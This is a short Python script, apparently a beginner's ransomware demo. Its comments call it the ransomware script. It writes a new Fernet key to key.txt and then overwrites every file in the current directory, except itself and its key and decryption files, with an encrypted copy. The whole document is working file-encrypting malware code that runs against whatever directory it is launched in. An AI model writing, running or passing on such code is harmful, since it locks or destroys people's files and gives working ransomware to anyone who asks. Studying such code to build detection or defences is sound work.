import os
from cryptography import fernet

Files = []

key = fernet.Fernet.generate_key()
# cipher = fernet.Fernet(key)

for file in os.listdir():
    if os.path.isfile(file):  #This condition ensures we only process files, not directories
        if file != "ransom.py" and file != "key.txt" and file != 'decryption.py':  #Exclude the ransomware script itself, the key and decryption script
            Files.append(file)

with open('key.txt', 'wb') as thekey: #Write "thekey" file to store our key
    thekey.write(key)

# print(Files)
# print(key)
# print(thekey)

for file in Files:
    with open(file, 'rb') as thefile:
        content = thefile.read()
    content_encrypted = fernet.Fernet(key).encrypt(content)
    # content_encrypted = cipher.encrypt(content) #we can use: cipher = fernet.Fernet(key)
    with open(file,'wb') as thefile:
        thefile.write(content_encrypted)